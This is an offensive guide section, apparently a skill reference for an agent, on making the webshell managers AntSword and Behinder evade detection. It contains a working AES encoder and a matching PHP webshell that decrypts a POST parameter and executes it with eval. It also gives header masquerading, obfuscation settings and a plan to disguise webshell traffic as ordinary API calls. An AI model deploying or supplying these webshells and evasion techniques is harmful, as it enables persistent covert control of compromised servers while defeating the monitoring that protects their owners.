### 5.1 AntSword (蚁剑) Evasion Configuration

**Encoder customization for bypass:**

```javascript
// Custom AntSword encoder: AES-256-CBC + Base64
'use strict';

module.exports = (pwd, data, ext = {}) => {
    // Generate random IV
    let iv = '';
    for (let i = 0; i < 16; i++) {
        iv += String.fromCharCode(Math.floor(Math.random() * 256));
    }

    // AES-256-CBC encryption
    let CryptoJS = require('crypto-js');
    let key = CryptoJS.SHA256(pwd);
    let encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: CryptoJS.enc.Latin1.parse(iv),
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
    });

    // Combine IV + ciphertext
    let payload = iv + encrypted.ciphertext.toString(CryptoJS.enc.Latin1);
    return Buffer.from(payload, 'latin1').toString('base64');
};
```

**AntSword custom decoder (PHP side):**

```php
<?php
// AntSword AES-256-CBC decoder
$pass = 'ant';
$payload = base64_decode($_POST[$pass]);
$iv = substr($payload, 0, 16);
$encrypted = substr($payload, 16);
$key = hash('sha256', $pass, true);
$data = openssl_decrypt($encrypted, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
@eval($data);
?>
```

**AntSword traffic masquerading configuration:**

```
HTTP Headers configuration in AntSword:
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
- Content-Type: application/x-www-form-urlencoded; charset=UTF-8
- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
- Accept-Language: en-US,en;q=0.5
- Accept-Encoding: gzip, deflate
- X-Requested-With: XMLHttpRequest
- Connection: keep-alive
- Cookie: PHPSESSID=random_session_id
```

### 5.2 Behinder (冰蝎) Evasion Configuration

**Behinder 4.0+ evasion features:**

```
1. Dynamic key negotiation: Uses Diffie-Hellman key exchange
2. AES encryption with random IV per request
3. Binary payload transmission (not Base64)
4. Custom HTTP header encryption
5. Payload splitting across multiple HTTP headers
```

**Behinder custom configuration:**

```xml
<!-- Behinder config.xml customization -->
<config>
    <transport>
        <type>aes</type>
        <key_negotiation>dh</key_negotiation>
        <encode>base64</encode>
        <header_encrypt>true</header_encrypt>
    </transport>
    <request>
        <method>POST</method>
        <user_agent>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</user_agent>
        <timeout>30000</timeout>
        <delay>0</delay>
        <headers>
            <X-Custom>value</X-Custom>
            <Accept-Language>zh-CN,zh;q=0.9</Accept-Language>
        </headers>
    </request>
    <obfuscation>
        <variable_randomization>true</variable_randomization>
        <string_encryption>xor</string_encryption>
        <function_obfuscation>true</function_obfuscation>
        <dead_code_injection>true</dead_code_injection>
    </obfuscation>
</config>
```

**Behinder traffic pattern concealment:**

```
Strategy: Make Behinder traffic look like legitimate API calls

1. Use REST-like URL patterns:
   POST /api/v1/status HTTP/1.1
   POST /api/v1/data/sync HTTP/1.1
   POST /api/v2/auth/refresh HTTP/1.1

2. Mimic common API response formats:
   {"code":200,"message":"success","data":{}}

3. Add realistic timing jitter:
   Random delay of 100-500ms between requests

4. Use HTTP/2 for multiplexing
```



---
📖 本切片 1/2 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-05-webshell-management-tools-evas-02.md")`